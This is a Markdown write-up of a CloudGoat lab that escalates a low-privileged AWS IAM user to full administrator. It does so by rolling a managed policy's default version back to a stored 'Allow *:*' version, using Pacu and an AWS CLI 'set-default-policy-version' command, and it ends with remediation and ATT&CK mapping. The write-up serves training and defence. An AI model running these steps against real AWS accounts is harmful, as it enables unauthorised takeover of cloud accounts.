@@ -1,0 +1,273 @@
+# 🥷 CloudGoat: IAM Privesc by Rollback
+
+_Write-up: Escalating to full admin by rolling an IAM policy back to an old, over-permissive version_
+
+## 🧭 Overview
+
+**Scenario:** `iam_privesc_by_rollback` \
+**Platform:** [CloudGoat (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/cloudgoat) \
+**Tools:** [Pacu](https://github.com/RhinoSecurityLabs/pacu) + AWS CLI \
+**Objective:** Starting as the low-privileged `raynor` user, escalate to full administrator by exploiting `iam:SetDefaultPolicyVersion` on the user's own attached policy.
+
+## ⚔️ Attack Path Summary
+
+`raynor` (read + `SetDefaultPolicyVersion`) → Enumerate own permissions → Discover the policy keeps 5 versions → Inspect each version → Roll the default back to `v3` (`Allow *:*`) → Full admin
+
+This is the smallest privesc in the CloudGoat catalogue — a single API call — but it demonstrates a subtle IAM footgun worth internalising: **a managed policy remembers every version it ever had.**
+
+## 🔑 Phase 1: Initial Access
+
+The scenario hands you a single access key pair. I imported it straight into Pacu, which makes the enumeration and privesc modules trivial to drive.
+
+#### Configure Profile & Import into Pacu
+
+```bash
+aws configure --profile raynor
+# Access Key: AKIA****************
+# Secret Key: SsM4zCOkOXyDkHda9UNn********************
+```
+
+```text
+Pacu > import_keys raynor
+```
+
+Before any enumeration, Pacu knows nothing beyond the raw key:
+
+```text
+Pacu (main:imported-raynor) > whoami
+{
+  "UserName": null,
+  "Arn": null,
+  "AccountId": null,
+  "AccessKeyId": "AKIA****************",
+  "PermissionsConfirmed": null,
+  "Permissions": { "Allow": {}, "Deny": {} }
+}
+```
+
+## 🗺️ Phase 2: Enumerate the User's Permissions
+
+Pacu's `iam__enum_permissions` module walks the caller's attached and inline policies and builds a confirmed permission set.
+
+```text
+Pacu (main:imported-raynor) > run iam__enum_permissions
+
+[iam__enum_permissions] MODULE SUMMARY:
+  66 Confirmed permissions for user: raynor-cgid8o7w9dkof1.
+```
+
+```text
+Pacu (main:imported-raynor) > whoami
+{
+  "UserName": "raynor-cgid8o7w9dkof1",
+  "Arn": "arn:aws:iam::7912********:user/raynor-cgid8o7w9dkof1",
+  "AccountId": "7912********",
+  "Policies": [
+    {
+      "PolicyName": "cg-raynor-policy-cgid8o7w9dkof1",
+      "PolicyArn": "arn:aws:iam::7912********:policy/cg-raynor-policy-cgid8o7w9dkof1"
+    }
+  ],
+  "Permissions": {
+    "Allow": {
+      "iam:getpolicyversion":        { "Resources": ["*"] },
+      "iam:listpolicyversions":      { "Resources": ["*"] },
+      "iam:setdefaultpolicyversion": { "Resources": ["*"] },
+      "iam:getpolicy":               { "Resources": ["*"] },
+      "iam:listpolicies":            { "Resources": ["*"] },
+      "iam:listattacheduserpolicies":{ "Resources": ["*"] }
+      /* …60 more iam:Get* / iam:List* actions… */
+    },
+    "Deny": {}
+  }
+}
+```
+
+#### Key Finding
+
+Buried in a sea of harmless `iam:Get*` / `iam:List*` read permissions sits one write action:
+
+```text
+iam:SetDefaultPolicyVersion  →  Resource: *
+```
+
+That single verb is the whole scenario. It lets `raynor` choose **which stored version of a managed policy is the active one** — including the policy attached to `raynor` itself.
+
+## 🔍 Phase 3: Find the Escalation Path
+
+Pacu's `iam__privesc_scan` module cross-references the confirmed permissions against its library of known escalation methods and immediately flags one:
+
+```text
+Pacu (main:imported-raynor) > run iam__privesc_scan
+
+[iam__privesc_scan] Escalation methods for current user:
+[iam__privesc_scan]   CONFIRMED: SetExistingDefaultPolicyVersion
+[iam__privesc_scan] Attempting confirmed privilege escalation methods...
+```
+
+The module then dumps every version of `raynor`'s policy so we can pick a target.
+
+## 🧨 Phase 4: Inspect the Policy Versions
+
+A customer-managed policy in AWS can hold up to **five versions**, but only one is the *default* (active) version at a time. Changing an existing policy doesn't overwrite the old document — it stacks a new version on top and flips the default pointer. The old, possibly dangerous versions stick around, fully intact.
+
+Here is what `cg-raynor-policy` has been carrying:
+
+```text
+[iam__privesc_scan] Version (default): v1
+```
+```json
+{
+  "Statement": [
+    {
+      "Sid": "IAMPrivilegeEscalationByRollback",
+      "Effect": "Allow",
+      "Action": ["iam:Get*", "iam:List*", "iam:SetDefaultPolicyVersion"],
+      "Resource": "*"
+    }
+  ]
+}
+```
+
+```text
+[iam__privesc_scan] Version: v3
+```
+```json
+{
+  "Statement": [
+    { "Action": "*", "Effect": "Allow", "Resource": "*" }
+  ]
+}
+```
+
+The other three versions are noise — a stale `iam:Get*` grant (`v2`/`v4`, gated on 2017 date conditions) and an IP-scoped `Deny` (`v2`). But **`v3` is `Allow *:*`** — a full administrator grant that used to be live and is still sitting in the version history, one API call away from being reactivated.
+
+The current default `v1` deliberately hands us `iam:SetDefaultPolicyVersion`. AWS trusts us to manage our own policy's versions; it does not care that one of those versions is god-mode.
+
+## 🎯 Phase 5: Roll Back to Admin
+
+#### The Pacu Way
+
+The privesc module simply asks which version to switch to:
+
+```text
+[iam__privesc_scan] What version would you like to switch to (example: v1)?
+                    Just press enter to keep it as the default: v3
+[iam__privesc_scan]   Successfully set the default policy version to v3!
+
+[iam__privesc_scan] MODULE SUMMARY:
+  Privilege escalation was successful
+```
+
+#### The Manual Way
+
+The primitive underneath is a one-liner — no Pacu required:
+
+```bash
+# Confirm the versions on our own policy
+aws iam list-policy-versions \
+  --policy-arn arn:aws:iam::7912********:policy/cg-raynor-policy-cgid8o7w9dkof1 \
+  --profile raynor
+
+# Flip the default pointer back to the admin version
+aws iam set-default-policy-version \
+  --policy-arn arn:aws:iam::7912********:policy/cg-raynor-policy-cgid8o7w9dkof1 \
+  --version-id v3 \
+  --profile raynor
+```
+
+The moment `v3` becomes the default, the policy attached to `raynor` resolves to `Allow *:*`. We are now a full administrator using the exact same access key we started with.
+
+#### Verify the New Powers
+
+```bash
+# Before rollback this was denied; now it succeeds
+aws iam list-users --profile raynor
+aws s3 ls --profile raynor
+aws sts get-caller-identity --profile raynor
+```
+
+## 📐 Attack Chain Diagram
+
+```
+┌────────────────────────────────────┐
+│  raynor                            │
+│  iam:Get* / List*                  │
+│  iam:SetDefaultPolicyVersion  ←────│─┐ the one write we have
+└───────────────┬────────────────────┘ │
+                │ list-policy-versions │
+                ▼                      │
+┌────────────────────────────────────┐ │
+│  cg-raynor-policy version history  │ │
+│   v1 (default) → limited read      │ │
+│   v3           → Allow *:*   ★     │ │
+└───────────────┬────────────────────┘ │
+                │ set-default-policy-version --version-id v3
+                ▼                      │
+┌────────────────────────────────────┐ │
+│  Default now resolves to v3        │─┘
+│  raynor == full administrator      │
+└────────────────────────────────────┘
+```
+
+## 🚨 Weaknesses Demonstrated
+
+| # | Weakness | CWE |
+|---|----------|-----|
+| 1 | `iam:SetDefaultPolicyVersion` granted over `Resource: *`, including the caller's own policy | CWE-732 |
+| 2 | An over-permissive `Allow *:*` version left in the policy's version history | CWE-266 |
+| 3 | A principal permitted to modify the policy that governs it (self-referential privilege) | CWE-269 |
+
+## 💡 Remediation
+
+1. **Never grant `iam:SetDefaultPolicyVersion` broadly.** If you must delegate policy versioning, scope the `Resource` to specific, non-privileged policy ARNs — never `*`, and never the caller's own policy.
+2. **Prune old policy versions.** A managed policy silently retains up to five versions. Run `list-policy-versions` in audit and delete any historical version that grants more than the current default. An admin-grade `v3` is a live liability even when `v1` is active.
+3. **Break the self-referential loop.** A principal should not hold write permissions over the policy that defines its own permissions. Separate policy-administration duties from the identities those policies govern.
+4. **Alert on `SetDefaultPolicyVersion`.** This is a rare, high-signal CloudTrail event. Any occurrence — especially where the caller and the policy's principal overlap — deserves a page.
+5. **Prefer immutable policy updates.** Treat policies as code: change them through reviewed IaC (Terraform/CloudFormation) so version history reflects intentional, audited states rather than forgotten admin grants.
+
+## 🎯 MITRE ATT&CK Mapping
+
+| Tactic | Technique | ID |
+|--------|-----------|-----|
+| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 |
+| Privilege Escalation | Account Manipulation | T1098 |
+| Defense Evasion | Modify Cloud Compute / Identity Configuration | T1578 |
+| Discovery | Cloud Infrastructure Discovery | T1580 |
+
+## 🛠️ Commands Reference
+
+```bash
+# Recon (Pacu)
+import_keys raynor
+run iam__enum_permissions
+whoami
+run iam__privesc_scan
+
+# Recon (raw CLI)
+aws sts get-caller-identity --profile raynor
+aws iam list-attached-user-policies --user-name <user> --profile raynor
+aws iam list-policy-versions --policy-arn <arn> --profile raynor
+aws iam get-policy-version --policy-arn <arn> --version-id v3 --profile raynor
+
+# Privesc — the whole exploit
+aws iam set-default-policy-version --policy-arn <arn> --version-id v3 --profile raynor
+
+# Verify
+aws iam list-users --profile raynor
+aws s3 ls --profile raynor
+```
+
+## 📚 Additional Resources
+
+- [AWS IAM CLI Reference](https://docs.aws.amazon.com/cli/latest/reference/iam/)
+- [Managed policies and versioning](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-versioning.html)
+- [Rhino Security Labs: AWS IAM Privilege Escalation methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
+- [CloudGoat iam_privesc_by_rollback scenario](https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/iam_privesc_by_rollback)
+
+## 🎓 Key Takeaways
+
+1. **Policies have a memory.** Every edit to a managed policy stacks a new version and keeps the old ones. `SetDefaultPolicyVersion` doesn't rewrite anything — it just repoints the default at whatever is already stored, including versions that were meant to be retired.
+2. **One verb can be the whole exploit.** Sixty-five of `raynor`'s permissions were read-only decoration. The escalation lived in a single write action over a single resource.
+3. **`Resource: *` on a versioning permission is a self-grant.** If a principal can set the default version of *any* policy, it can set the default version of *its own* policy — and that closes the loop to full admin.
+4. **Audit history, not just the current state.** A policy that looks locked-down today can hide an `Allow *:*` one rollback away. Reviewing only the active version misses the real attack surface.
